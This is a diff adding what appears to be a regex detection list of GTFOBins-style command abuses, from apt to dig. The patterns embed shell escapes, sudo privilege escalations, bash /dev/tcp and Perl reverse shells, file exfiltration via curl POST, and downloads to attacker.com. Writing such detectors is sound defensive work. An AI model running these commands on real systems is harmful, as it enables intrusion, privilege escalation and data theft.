@@ -1,0 +1,874 @@
+apt-get changelog apt
+sudo apt-get changelog apt
+echo 'Dpkg::Pre-Invoke {"/bin/sh\;false"}' > \$[A-Z_]+|echo 'Dpkg::Pre-Invoke {"/bin/sh\;false"}' > [ a-z0-9A-Z\.\-\/\'\"_\@]+|echo 'Dpkg::Pre-Invoke {"/bin/sh\;false"}' > http\w:[\w\.\/\?\=\&\%]+
+sudo apt-get install -c http\w:[\w\.\/\?\=\&\%]+ sl|sudo apt-get install -c \$[A-Z_]+ sl|sudo apt-get install -c [ a-z0-9A-Z\.\-\/\'\"_\@]+ sl
+apt-get changelog apt
+sudo apt-get changelog apt
+echo 'Dpkg::Pre-Invoke {"/bin/sh\;false"}' > \$[A-Z_]+|echo 'Dpkg::Pre-Invoke {"/bin/sh\;false"}' > [ a-z0-9A-Z\.\-\/\'\"_\@]+|echo 'Dpkg::Pre-Invoke {"/bin/sh\;false"}' > http\w:[\w\.\/\?\=\&\%]+
+sudo apt install -c \$[A-Z_]+ sl|sudo apt install -c http\w:[\w\.\/\?\=\&\%]+ sl|sudo apt install -c [ a-z0-9A-Z\.\-\/\'\"_\@]+ sl
+ar r "[ a-z0-9A-Z\.\-\/\'\"_\@]+" "[ a-z0-9A-Z\.\-\/\'\"_\@]+"|ar r "\$[A-Z_]+" "\$[A-Z_]+"|ar r "http\w:[\w\.\/\?\=\&\%]+" "http\w:[\w\.\/\?\=\&\%]+"
+\./ar r "[ a-z0-9A-Z\.\-\/\'\"_\@]+" "[ a-z0-9A-Z\.\-\/\'\"_\@]+"|\./ar r "\$[A-Z_]+" "\$[A-Z_]+"|\./ar r "http\w:[\w\.\/\?\=\&\%]+" "http\w:[\w\.\/\?\=\&\%]+"
+sudo ar r "\$[A-Z_]+" "\$[A-Z_]+"|sudo ar r "[ a-z0-9A-Z\.\-\/\'\"_\@]+" "[ a-z0-9A-Z\.\-\/\'\"_\@]+"|sudo ar r "http\w:[\w\.\/\?\=\&\%]+" "http\w:[\w\.\/\?\=\&\%]+"
+chmod \+x \$[A-Z_]+|chmod \+x http\w:[\w\.\/\?\=\&\%]+|chmod \+x [ a-z0-9A-Z\.\-\/\'\"_\@]+
+aria2c --allow-overwrite [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+://attacker\.com/aaaaaaaaaaaaaaaa
+chmod \+x \$[A-Z_]+|chmod \+x http\w:[\w\.\/\?\=\&\%]+|chmod \+x [ a-z0-9A-Z\.\-\/\'\"_\@]+
+chmod \+x \$[A-Z_]+|chmod \+x http\w:[\w\.\/\?\=\&\%]+|chmod \+x [ a-z0-9A-Z\.\-\/\'\"_\@]+
+arp -v -f "\$[A-Z_]+"|arp -v -f "http\w:[\w\.\/\?\=\&\%]+"|arp -v -f "[ a-z0-9A-Z\.\-\/\'\"_\@]+"
+\./arp -v -f "\$[A-Z_]+"|\./arp -v -f "[ a-z0-9A-Z\.\-\/\'\"_\@]+"|\./arp -v -f "http\w:[\w\.\/\?\=\&\%]+"
+sudo arp -v -f "[ a-z0-9A-Z\.\-\/\'\"_\@]+"|sudo arp -v -f "http\w:[\w\.\/\?\=\&\%]+"|sudo arp -v -f "\$[A-Z_]+"
+ash -c 'echo DATA > http\w:[\w\.\/\?\=\&\%]+'|ash -c 'echo DATA > \$[A-Z_]+'|ash -c 'echo DATA > [ a-z0-9A-Z\.\-\/\'\"_\@]+'
+echo "/bin/sh <\$\(tty\) >\$\(tty\) 2>\$\(tty\)" \| at now\; tail -f /dev/null
+echo "/bin/sh <\$\(tty\) >\$\(tty\) 2>\$\(tty\)" \| sudo at now\; tail -f /dev/null
+atobm \$[A-Z_]+ 2>&1 \| awk -F "'" '{printf "%s"\, \$2}'|atobm http\w:[\w\.\/\?\=\&\%]+ 2>&1 \| awk -F "'" '{printf "%s"\, \$2}'|atobm [ a-z0-9A-Z\.\-\/\'\"_\@]+ 2>&1 \| awk -F "'" '{printf "%s"\, \$2}'
+\./atobm http\w:[\w\.\/\?\=\&\%]+ 2>&1 \| awk -F "'" '{printf "%s"\, \$2}'|\./atobm [ a-z0-9A-Z\.\-\/\'\"_\@]+ 2>&1 \| awk -F "'" '{printf "%s"\, \$2}'|\./atobm \$[A-Z_]+ 2>&1 \| awk -F "'" '{printf "%s"\, \$2}'
+sudo atobm \$[A-Z_]+ 2>&1 \| awk -F "'" '{printf "%s"\, \$2}'|sudo atobm http\w:[\w\.\/\?\=\&\%]+ 2>&1 \| awk -F "'" '{printf "%s"\, \$2}'|sudo atobm [ a-z0-9A-Z\.\-\/\'\"_\@]+ 2>&1 \| awk -F "'" '{printf "%s"\, \$2}'
+awk 'BEGIN {system\("/bin/sh"\)}'
+awk -v [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+ -v [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+ 'BEGIN {|awk -v [\w\-_]+=http\w:[\w\.\/\?\=\&\%]+ -v [\w\-_]+=http\w:[\w\.\/\?\=\&\%]+ 'BEGIN {|awk -v [\w\-_]+=\$[A-Z_]+ -v [\w\-_]+=\$[A-Z_]+ 'BEGIN {
+while \(c && \(c \|& getline\) > 0\) print \$0 \|& s\; close\(c\)}}'
+while \(c && \(c \|& getline\) > 0\) print \$0 \|& s\; close\(c\)}}'
+awk '//' "[ a-z0-9A-Z\.\-\/\'\"_\@]+"|awk '//' "http\w:[\w\.\/\?\=\&\%]+"|awk '//' "\$[A-Z_]+"
+\./awk '//' "\$[A-Z_]+"|\./awk '//' "http\w:[\w\.\/\?\=\&\%]+"|\./awk '//' "[ a-z0-9A-Z\.\-\/\'\"_\@]+"
+sudo awk 'BEGIN {system\("/bin/sh"\)}'
+\./awk 'BEGIN {system\("/bin/sh"\)}'
+base32 "\$[A-Z_]+" \| base32 --decode|base32 "http\w:[\w\.\/\?\=\&\%]+" \| base32 --decode|base32 "[ a-z0-9A-Z\.\-\/\'\"_\@]+" \| base32 --decode
+base32 "\$[A-Z_]+" \| base32 --decode|base32 "http\w:[\w\.\/\?\=\&\%]+" \| base32 --decode|base32 "[ a-z0-9A-Z\.\-\/\'\"_\@]+" \| base32 --decode
+sudo base32 "http\w:[\w\.\/\?\=\&\%]+" \| base32 --decode|sudo base32 "[ a-z0-9A-Z\.\-\/\'\"_\@]+" \| base32 --decode|sudo base32 "\$[A-Z_]+" \| base32 --decode
+base64 "http\w:[\w\.\/\?\=\&\%]+" \| base64 --decode|base64 "\$[A-Z_]+" \| base64 --decode|base64 "[ a-z0-9A-Z\.\-\/\'\"_\@]+" \| base64 --decode
+\./base64 "http\w:[\w\.\/\?\=\&\%]+" \| base64 --decode|\./base64 "[ a-z0-9A-Z\.\-\/\'\"_\@]+" \| base64 --decode|\./base64 "\$[A-Z_]+" \| base64 --decode
+sudo base64 "\$[A-Z_]+" \| base64 --decode|sudo base64 "[ a-z0-9A-Z\.\-\/\'\"_\@]+" \| base64 --decode|sudo base64 "http\w:[\w\.\/\?\=\&\%]+" \| base64 --decode
+basenc --base64 http\w:[\w\.\/\?\=\&\%]+ \| basenc -d --base64|basenc --base64 [ a-z0-9A-Z\.\-\/\'\"_\@]+ \| basenc -d --base64|basenc --base64 \$[A-Z_]+ \| basenc -d --base64
+basenc --base64 http\w:[\w\.\/\?\=\&\%]+ \| basenc -d --base64|basenc --base64 [ a-z0-9A-Z\.\-\/\'\"_\@]+ \| basenc -d --base64|basenc --base64 \$[A-Z_]+ \| basenc -d --base64
+sudo basenc --base64 [ a-z0-9A-Z\.\-\/\'\"_\@]+ \| basenc -d --base64|sudo basenc --base64 \$[A-Z_]+ \| basenc -d --base64|sudo basenc --base64 http\w:[\w\.\/\?\=\&\%]+ \| basenc -d --base64
+bash -c 'exec bash -i &>/dev/tcp/\$[A-Z_]+/\$[A-Z_]+ <&1'|bash -c 'exec bash -i &>/dev/tcp/[ a-z0-9A-Z\.\-\/\'\"_\@]+/[ a-z0-9A-Z\.\-\/\'\"_\@]+ <&1'|bash -c 'exec bash -i &>/dev/tcp/http\w:[\w\.\/\?\=\&\%]+/http\w:[\w\.\/\?\=\&\%]+ <&1'
+bash -c 'echo -e "POST / HTTP/0\.9/n/n\$\(<http\w:[\w\.\/\?\=\&\%]+\)" > /dev/tcp/http\w:[\w\.\/\?\=\&\%]+/http\w:[\w\.\/\?\=\&\%]+'|bash -c 'echo -e "POST / HTTP/0\.9/n/n\$\(<[ a-z0-9A-Z\.\-\/\'\"_\@]+\)" > /dev/tcp/[ a-z0-9A-Z\.\-\/\'\"_\@]+/[ a-z0-9A-Z\.\-\/\'\"_\@]+'|bash -c 'echo -e "POST / HTTP/0\.9/n/n\$\(<\$[A-Z_]+\)" > /dev/tcp/\$[A-Z_]+/\$[A-Z_]+'
+bash -c 'cat [ a-z0-9A-Z\.\-\/\'\"_\@]+ > /dev/tcp/[ a-z0-9A-Z\.\-\/\'\"_\@]+/[ a-z0-9A-Z\.\-\/\'\"_\@]+'|bash -c 'cat http\w:[\w\.\/\?\=\&\%]+ > /dev/tcp/http\w:[\w\.\/\?\=\&\%]+/http\w:[\w\.\/\?\=\&\%]+'|bash -c 'cat \$[A-Z_]+ > /dev/tcp/\$[A-Z_]+/\$[A-Z_]+'
+bash -c 'cat < /dev/tcp/[ a-z0-9A-Z\.\-\/\'\"_\@]+/[ a-z0-9A-Z\.\-\/\'\"_\@]+ > [ a-z0-9A-Z\.\-\/\'\"_\@]+'|bash -c 'cat < /dev/tcp/\$[A-Z_]+/\$[A-Z_]+ > \$[A-Z_]+'|bash -c 'cat < /dev/tcp/http\w:[\w\.\/\?\=\&\%]+/http\w:[\w\.\/\?\=\&\%]+ > http\w:[\w\.\/\?\=\&\%]+'
+bash -c 'echo DATA > http\w:[\w\.\/\?\=\&\%]+'|bash -c 'echo DATA > [ a-z0-9A-Z\.\-\/\'\"_\@]+'|bash -c 'echo DATA > \$[A-Z_]+'
+history -w http\w:[\w\.\/\?\=\&\%]+|history -w [ a-z0-9A-Z\.\-\/\'\"_\@]+|history -w \$[A-Z_]+
+bash -c 'echo "\$\(<http\w:[\w\.\/\?\=\&\%]+\)"'|bash -c 'echo "\$\(<\$[A-Z_]+\)"'|bash -c 'echo "\$\(<[ a-z0-9A-Z\.\-\/\'\"_\@]+\)"'
+history -r http\w:[\w\.\/\?\=\&\%]+|history -r [ a-z0-9A-Z\.\-\/\'\"_\@]+|history -r \$[A-Z_]+
+bash -c 'enable -f \./lib\.so x'
+sudo bpftrace -e 'BEGIN {system\("/bin/sh"\)\;exit\(\)}'
+echo 'BEGIN {system\("/bin/sh"\)\;exit\(\)}' >[ a-z0-9A-Z\.\-\/\'\"_\@]+|echo 'BEGIN {system\("/bin/sh"\)\;exit\(\)}' >http\w:[\w\.\/\?\=\&\%]+|echo 'BEGIN {system\("/bin/sh"\)\;exit\(\)}' >\$[A-Z_]+
+sudo bpftrace http\w:[\w\.\/\?\=\&\%]+|sudo bpftrace \$[A-Z_]+|sudo bpftrace [ a-z0-9A-Z\.\-\/\'\"_\@]+
+sudo bpftrace -c /bin/sh -e 'END {exit\(\)}'
+bridge -b "http\w:[\w\.\/\?\=\&\%]+"|bridge -b "\$[A-Z_]+"|bridge -b "[ a-z0-9A-Z\.\-\/\'\"_\@]+"
+\./bridge -b "[ a-z0-9A-Z\.\-\/\'\"_\@]+"|\./bridge -b "\$[A-Z_]+"|\./bridge -b "http\w:[\w\.\/\?\=\&\%]+"
+sudo bridge -b "\$[A-Z_]+"|sudo bridge -b "[ a-z0-9A-Z\.\-\/\'\"_\@]+"|sudo bridge -b "http\w:[\w\.\/\?\=\&\%]+"
+bundler exec /bin/sh
+bundler exec /bin/sh
+system\('/bin/sh -c /bin/sh'\)
+echo 'system\("/bin/sh"\)' > [ a-z0-9A-Z\.\-\/\'\"_\@]+/Gemfile|echo 'system\("/bin/sh"\)' > http\w:[\w\.\/\?\=\&\%]+/Gemfile|echo 'system\("/bin/sh"\)' > \$[A-Z_]+/Gemfile
+sudo bundler help
+sudo busctl --show-machine
+busybox httpd -f -p http\w:[\w\.\/\?\=\&\%]+ -h \.|busybox httpd -f -p [ a-z0-9A-Z\.\-\/\'\"_\@]+ -h \.|busybox httpd -f -p \$[A-Z_]+ -h \.
+busybox sh -c 'echo "DATA" > \$[A-Z_]+'|busybox sh -c 'echo "DATA" > http\w:[\w\.\/\?\=\&\%]+'|busybox sh -c 'echo "DATA" > [ a-z0-9A-Z\.\-\/\'\"_\@]+'
+\./busybox cat "[ a-z0-9A-Z\.\-\/\'\"_\@]+"|\./busybox cat "http\w:[\w\.\/\?\=\&\%]+"|\./busybox cat "\$[A-Z_]+"
+sudo busybox sh
+echo 'system\("/bin/sh"\)' > \$[A-Z_]+|echo 'system\("/bin/sh"\)' > [ a-z0-9A-Z\.\-\/\'\"_\@]+|echo 'system\("/bin/sh"\)' > http\w:[\w\.\/\?\=\&\%]+
+echo 'system\("/bin/sh"\)' > \$[A-Z_]+|echo 'system\("/bin/sh"\)' > [ a-z0-9A-Z\.\-\/\'\"_\@]+|echo 'system\("/bin/sh"\)' > http\w:[\w\.\/\?\=\&\%]+
+sudo byebug http\w:[\w\.\/\?\=\&\%]+|sudo byebug \$[A-Z_]+|sudo byebug [ a-z0-9A-Z\.\-\/\'\"_\@]+
+echo 'system\("/bin/sh"\)' > \$[A-Z_]+|echo 'system\("/bin/sh"\)' > [ a-z0-9A-Z\.\-\/\'\"_\@]+|echo 'system\("/bin/sh"\)' > http\w:[\w\.\/\?\=\&\%]+
+cancel -u "\$\(cat [ a-z0-9A-Z\.\-\/\'\"_\@]+\)" -h [ a-z0-9A-Z\.\-\/\'\"_\@]+:[ a-z0-9A-Z\.\-\/\'\"_\@]+|cancel -u "\$\(cat \$[A-Z_]+\)" -h \$[A-Z_]+:\$[A-Z_]+|cancel -u "\$\(cat http\w:[\w\.\/\?\=\&\%]+\)" -h http\w:[\w\.\/\?\=\&\%]+:http\w:[\w\.\/\?\=\&\%]+
+\./capsh [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+
+sudo capsh --
+sudo cat "[ a-z0-9A-Z\.\-\/\'\"_\@]+"|sudo cat "http\w:[\w\.\/\?\=\&\%]+"|sudo cat "\$[A-Z_]+"
+check_by_ssh -o "ProxyCommand /bin/sh -i <\$\(tty\) \|& tee \$\(tty\)" -H localhost -C xx
+sudo check_by_ssh -o "ProxyCommand /bin/sh -i <\$\(tty\) \|& tee \$\(tty\)" -H localhost -C xx
+check_log -F [ a-z0-9A-Z\.\-\/\'\"_\@]+ -O [ a-z0-9A-Z\.\-\/\'\"_\@]+|check_log -F http\w:[\w\.\/\?\=\&\%]+ -O http\w:[\w\.\/\?\=\&\%]+|check_log -F \$[A-Z_]+ -O \$[A-Z_]+
+check_log -F [ a-z0-9A-Z\.\-\/\'\"_\@]+ -O [ a-z0-9A-Z\.\-\/\'\"_\@]+|check_log -F http\w:[\w\.\/\?\=\&\%]+ -O http\w:[\w\.\/\?\=\&\%]+|check_log -F \$[A-Z_]+ -O \$[A-Z_]+
+sudo check_log -F http\w:[\w\.\/\?\=\&\%]+ -O http\w:[\w\.\/\?\=\&\%]+|sudo check_log -F [ a-z0-9A-Z\.\-\/\'\"_\@]+ -O [ a-z0-9A-Z\.\-\/\'\"_\@]+|sudo check_log -F \$[A-Z_]+ -O \$[A-Z_]+
+chmod \+x \$[A-Z_]+|chmod \+x http\w:[\w\.\/\?\=\&\%]+|chmod \+x [ a-z0-9A-Z\.\-\/\'\"_\@]+
+check_ssl_cert --curl-bin \$[A-Z_]+ -H example\.net|check_ssl_cert --curl-bin http\w:[\w\.\/\?\=\&\%]+ -H example\.net|check_ssl_cert --curl-bin [ a-z0-9A-Z\.\-\/\'\"_\@]+ -H example\.net
+chmod \+x \$[A-Z_]+|chmod \+x http\w:[\w\.\/\?\=\&\%]+|chmod \+x [ a-z0-9A-Z\.\-\/\'\"_\@]+
+check_ssl_cert --curl-bin \$[A-Z_]+ -H example\.net|check_ssl_cert --curl-bin http\w:[\w\.\/\?\=\&\%]+ -H example\.net|check_ssl_cert --curl-bin [ a-z0-9A-Z\.\-\/\'\"_\@]+ -H example\.net
+sudo check_statusfile [ a-z0-9A-Z\.\-\/\'\"_\@]+|sudo check_statusfile http\w:[\w\.\/\?\=\&\%]+|sudo check_statusfile \$[A-Z_]+
+\./chmod 6777 [ a-z0-9A-Z\.\-\/\'\"_\@]+|\./chmod 6777 \$[A-Z_]+|\./chmod 6777 http\w:[\w\.\/\?\=\&\%]+
+sudo chmod 6777 [ a-z0-9A-Z\.\-\/\'\"_\@]+|sudo chmod 6777 http\w:[\w\.\/\?\=\&\%]+|sudo chmod 6777 \$[A-Z_]+
+\./chown \$\(id -un\):\$\(id -gn\) http\w:[\w\.\/\?\=\&\%]+|\./chown \$\(id -un\):\$\(id -gn\) \$[A-Z_]+|\./chown \$\(id -un\):\$\(id -gn\) [ a-z0-9A-Z\.\-\/\'\"_\@]+
+sudo chown \$\(id -un\):\$\(id -gn\) [ a-z0-9A-Z\.\-\/\'\"_\@]+|sudo chown \$\(id -un\):\$\(id -gn\) \$[A-Z_]+|sudo chown \$\(id -un\):\$\(id -gn\) http\w:[\w\.\/\?\=\&\%]+
+\./chroot / /bin/sh -p
+sudo chroot /
+echo 'CALL "SYSTEM" USING "/bin/sh"\.' > [ a-z0-9A-Z\.\-\/\'\"_\@]+/x|echo 'CALL "SYSTEM" USING "/bin/sh"\.' > http\w:[\w\.\/\?\=\&\%]+/x|echo 'CALL "SYSTEM" USING "/bin/sh"\.' > \$[A-Z_]+/x
+cobc -xFj --frelax-syntax-checks [ a-z0-9A-Z\.\-\/\'\"_\@]+/x|cobc -xFj --frelax-syntax-checks http\w:[\w\.\/\?\=\&\%]+/x|cobc -xFj --frelax-syntax-checks \$[A-Z_]+/x
+echo 'CALL "SYSTEM" USING "/bin/sh"\.' > [ a-z0-9A-Z\.\-\/\'\"_\@]+/x|echo 'CALL "SYSTEM" USING "/bin/sh"\.' > http\w:[\w\.\/\?\=\&\%]+/x|echo 'CALL "SYSTEM" USING "/bin/sh"\.' > \$[A-Z_]+/x
+sudo cobc -xFj --frelax-syntax-checks \$[A-Z_]+/x|sudo cobc -xFj --frelax-syntax-checks [ a-z0-9A-Z\.\-\/\'\"_\@]+/x|sudo cobc -xFj --frelax-syntax-checks http\w:[\w\.\/\?\=\&\%]+/x
+sudo column \$[A-Z_]+|sudo column [ a-z0-9A-Z\.\-\/\'\"_\@]+|sudo column http\w:[\w\.\/\?\=\&\%]+
+comm \$[A-Z_]+ /dev/null 2>/dev/null|comm http\w:[\w\.\/\?\=\&\%]+ /dev/null 2>/dev/null|comm [ a-z0-9A-Z\.\-\/\'\"_\@]+ /dev/null 2>/dev/null
+comm \$[A-Z_]+ /dev/null 2>/dev/null|comm http\w:[\w\.\/\?\=\&\%]+ /dev/null 2>/dev/null|comm [ a-z0-9A-Z\.\-\/\'\"_\@]+ /dev/null 2>/dev/null
+sudo comm [ a-z0-9A-Z\.\-\/\'\"_\@]+ /dev/null 2>/dev/null|sudo comm \$[A-Z_]+ /dev/null 2>/dev/null|sudo comm http\w:[\w\.\/\?\=\&\%]+ /dev/null 2>/dev/null
+echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >[ a-z0-9A-Z\.\-\/\'\"_\@]+/composer\.json|echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >\$[A-Z_]+/composer\.json|echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >http\w:[\w\.\/\?\=\&\%]+/composer\.json
+echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >[ a-z0-9A-Z\.\-\/\'\"_\@]+/composer\.json|echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >\$[A-Z_]+/composer\.json|echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >http\w:[\w\.\/\?\=\&\%]+/composer\.json
+echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >[ a-z0-9A-Z\.\-\/\'\"_\@]+/composer\.json|echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >\$[A-Z_]+/composer\.json|echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >http\w:[\w\.\/\?\=\&\%]+/composer\.json
+echo 'exec "/bin/sh"\;' >\$[A-Z_]+|echo 'exec "/bin/sh"\;' >http\w:[\w\.\/\?\=\&\%]+|echo 'exec "/bin/sh"\;' >[ a-z0-9A-Z\.\-\/\'\"_\@]+
+cowsay -f \$[A-Z_]+ x|cowsay -f http\w:[\w\.\/\?\=\&\%]+ x|cowsay -f [ a-z0-9A-Z\.\-\/\'\"_\@]+ x
+echo 'exec "/bin/sh"\;' >\$[A-Z_]+|echo 'exec "/bin/sh"\;' >http\w:[\w\.\/\?\=\&\%]+|echo 'exec "/bin/sh"\;' >[ a-z0-9A-Z\.\-\/\'\"_\@]+
+sudo cowsay -f \$[A-Z_]+ x|sudo cowsay -f http\w:[\w\.\/\?\=\&\%]+ x|sudo cowsay -f [ a-z0-9A-Z\.\-\/\'\"_\@]+ x
+echo 'exec "/bin/sh"\;' >\$[A-Z_]+|echo 'exec "/bin/sh"\;' >http\w:[\w\.\/\?\=\&\%]+|echo 'exec "/bin/sh"\;' >[ a-z0-9A-Z\.\-\/\'\"_\@]+
+cowthink -f http\w:[\w\.\/\?\=\&\%]+ x|cowthink -f \$[A-Z_]+ x|cowthink -f [ a-z0-9A-Z\.\-\/\'\"_\@]+ x
+echo 'exec "/bin/sh"\;' >\$[A-Z_]+|echo 'exec "/bin/sh"\;' >http\w:[\w\.\/\?\=\&\%]+|echo 'exec "/bin/sh"\;' >[ a-z0-9A-Z\.\-\/\'\"_\@]+
+sudo cowthink -f [ a-z0-9A-Z\.\-\/\'\"_\@]+ x|sudo cowthink -f \$[A-Z_]+ x|sudo cowthink -f http\w:[\w\.\/\?\=\&\%]+ x
+\./cp http\w:[\w\.\/\?\=\&\%]+ http\w:[\w\.\/\?\=\&\%]+|\./cp \$[A-Z_]+ \$[A-Z_]+|\./cp [ a-z0-9A-Z\.\-\/\'\"_\@]+ [ a-z0-9A-Z\.\-\/\'\"_\@]+
+sudo cp [ a-z0-9A-Z\.\-\/\'\"_\@]+ [ a-z0-9A-Z\.\-\/\'\"_\@]+|sudo cp http\w:[\w\.\/\?\=\&\%]+ http\w:[\w\.\/\?\=\&\%]+|sudo cp \$[A-Z_]+ \$[A-Z_]+
+! exec '/bin/bash'
+! use Socket\; my \$[\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+[ a-z0-9A-Z\.\-\/\'\"_\@]+{RHOST}"\; my \$[\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+{RPORT}\; socket\(S\,PF_INET\,SOCK_STREAM\,getprotobyname\("tcp"\)\)\; if\(connect\(S\,sockaddr_in\(\$p\,inet_aton\(\$i\)\)\)\){open\(STDIN\,">&S"\)\; open\(STDOUT\,">&S"\)\; open\(STDERR\,">&S"\)\; exec\("/bin/sh -i"\)\;}\;|! use Socket\; my \$[\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+http\w:[\w\.\/\?\=\&\%]+{RHOST}"\; my \$[\w\-_]+=http\w:[\w\.\/\?\=\&\%]+{RPORT}\; socket\(S\,PF_INET\,SOCK_STREAM\,getprotobyname\("tcp"\)\)\; if\(connect\(S\,sockaddr_in\(\$p\,inet_aton\(\$i\)\)\)\){open\(STDIN\,">&S"\)\; open\(STDOUT\,">&S"\)\; open\(STDERR\,">&S"\)\; exec\("/bin/sh -i"\)\;}\;|! use Socket\; my \$[\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\$[A-Z_]+{RHOST}"\; my \$[\w\-_]+=\$[A-Z_]+{RPORT}\; socket\(S\,PF_INET\,SOCK_STREAM\,getprotobyname\("tcp"\)\)\; if\(connect\(S\,sockaddr_in\(\$p\,inet_aton\(\$i\)\)\)\){open\(STDIN\,">&S"\)\; open\(STDOUT\,">&S"\)\; open\(STDERR\,">&S"\)\; exec\("/bin/sh -i"\)\;}\;
+! use File::Fetch\; my \$file =[ a-z0-9A-Z\.\-\/\'\"_\@]+\(File::Fetch->new\(uri => "http\w:[\w\.\/\?\=\&\%]+{URL}"\)\)->fetch\(\)\;|! use File::Fetch\; my \$file =[ a-z0-9A-Z\.\-\/\'\"_\@]+\(File::Fetch->new\(uri => "\$[A-Z_]+{URL}"\)\)->fetch\(\)\;|! use File::Fetch\; my \$file =[ a-z0-9A-Z\.\-\/\'\"_\@]+\(File::Fetch->new\(uri => "[ a-z0-9A-Z\.\-\/\'\"_\@]+{URL}"\)\)->fetch\(\)\;
+! exec '/bin/bash'
+cpulimit -l 100 -f /bin/sh
+sudo cpulimit -l 100 -f /bin/sh
+sudo crash -h
+sudo crontab -e
+ash -c 'echo DATA > http\w:[\w\.\/\?\=\&\%]+'|ash -c 'echo DATA > \$[A-Z_]+'|ash -c 'echo DATA > [ a-z0-9A-Z\.\-\/\'\"_\@]+'
+csplit [ a-z0-9A-Z\.\-\/\'\"_\@]+ 1|csplit http\w:[\w\.\/\?\=\&\%]+ 1|csplit \$[A-Z_]+ 1
+csplit [ a-z0-9A-Z\.\-\/\'\"_\@]+ 1|csplit http\w:[\w\.\/\?\=\&\%]+ 1|csplit \$[A-Z_]+ 1
+csplit [ a-z0-9A-Z\.\-\/\'\"_\@]+ 1|csplit http\w:[\w\.\/\?\=\&\%]+ 1|csplit \$[A-Z_]+ 1
+cupsfilter -i application/octet-stream -m application/octet-stream [ a-z0-9A-Z\.\-\/\'\"_\@]+|cupsfilter -i application/octet-stream -m application/octet-stream http\w:[\w\.\/\?\=\&\%]+|cupsfilter -i application/octet-stream -m application/octet-stream \$[A-Z_]+
+\./cupsfilter -i application/octet-stream -m application/octet-stream http\w:[\w\.\/\?\=\&\%]+|\./cupsfilter -i application/octet-stream -m application/octet-stream [ a-z0-9A-Z\.\-\/\'\"_\@]+|\./cupsfilter -i application/octet-stream -m application/octet-stream \$[A-Z_]+
+sudo cupsfilter -i application/octet-stream -m application/octet-stream [ a-z0-9A-Z\.\-\/\'\"_\@]+|sudo cupsfilter -i application/octet-stream -m application/octet-stream http\w:[\w\.\/\?\=\&\%]+|sudo cupsfilter -i application/octet-stream -m application/octet-stream \$[A-Z_]+
+curl -X POST -d @\$[\w\-_\/]+ [ a-z0-9A-Z\.\-\/\'\"_\@]+|curl -X POST -d @\$[\w\-_\/]+ http\w:[\w\.\/\?\=\&\%]+|curl -X POST -d @\$[\w\-_\/]+ \$[A-Z_]+
+curl http\w:[\w\.\/\?\=\&\%]+ -o http\w:[\w\.\/\?\=\&\%]+|curl \$[A-Z_]+ -o \$[A-Z_]+|curl [ a-z0-9A-Z\.\-\/\'\"_\@]+ -o [ a-z0-9A-Z\.\-\/\'\"_\@]+
+\./curl [ a-z0-9A-Z\.\-\/\'\"_\@]+ -o [ a-z0-9A-Z\.\-\/\'\"_\@]+|\./curl \$[A-Z_]+ -o \$[A-Z_]+|\./curl http\w:[\w\.\/\?\=\&\%]+ -o http\w:[\w\.\/\?\=\&\%]+
+sudo curl [ a-z0-9A-Z\.\-\/\'\"_\@]+ -o [ a-z0-9A-Z\.\-\/\'\"_\@]+|sudo curl http\w:[\w\.\/\?\=\&\%]+ -o http\w:[\w\.\/\?\=\&\%]+|sudo curl \$[A-Z_]+ -o \$[A-Z_]+
+cut -d "" -f1 "http\w:[\w\.\/\?\=\&\%]+"|cut -d "" -f1 "[ a-z0-9A-Z\.\-\/\'\"_\@]+"|cut -d "" -f1 "\$[A-Z_]+"
+\./cut -d "" -f1 "\$[A-Z_]+"|\./cut -d "" -f1 "[ a-z0-9A-Z\.\-\/\'\"_\@]+"|\./cut -d "" -f1 "http\w:[\w\.\/\?\=\&\%]+"
+sudo cut -d "" -f1 "http\w:[\w\.\/\?\=\&\%]+"|sudo cut -d "" -f1 "[ a-z0-9A-Z\.\-\/\'\"_\@]+"|sudo cut -d "" -f1 "\$[A-Z_]+"
+dash -c 'echo DATA > [ a-z0-9A-Z\.\-\/\'\"_\@]+'|dash -c 'echo DATA > \$[A-Z_]+'|dash -c 'echo DATA > http\w:[\w\.\/\?\=\&\%]+'
+date -f http\w:[\w\.\/\?\=\&\%]+|date -f \$[A-Z_]+|date -f [ a-z0-9A-Z\.\-\/\'\"_\@]+
+\./date -f [ a-z0-9A-Z\.\-\/\'\"_\@]+|\./date -f http\w:[\w\.\/\?\=\&\%]+|\./date -f \$[A-Z_]+
+sudo date -f http\w:[\w\.\/\?\=\&\%]+|sudo date -f \$[A-Z_]+|sudo date -f [ a-z0-9A-Z\.\-\/\'\"_\@]+
+dialog --textbox "http\w:[\w\.\/\?\=\&\%]+" 0 0|dialog --textbox "\$[A-Z_]+" 0 0|dialog --textbox "[ a-z0-9A-Z\.\-\/\'\"_\@]+" 0 0
+\./dialog --textbox "http\w:[\w\.\/\?\=\&\%]+" 0 0|\./dialog --textbox "\$[A-Z_]+" 0 0|\./dialog --textbox "[ a-z0-9A-Z\.\-\/\'\"_\@]+" 0 0
+sudo dialog --textbox "http\w:[\w\.\/\?\=\&\%]+" 0 0|sudo dialog --textbox "[ a-z0-9A-Z\.\-\/\'\"_\@]+" 0 0|sudo dialog --textbox "\$[A-Z_]+" 0 0
+dig -f http\w:[\w\.\/\?\=\&\%]+|dig -f \$[A-Z_]+|dig -f [ a-z0-9A-Z\.\-\/\'\"_\@]+
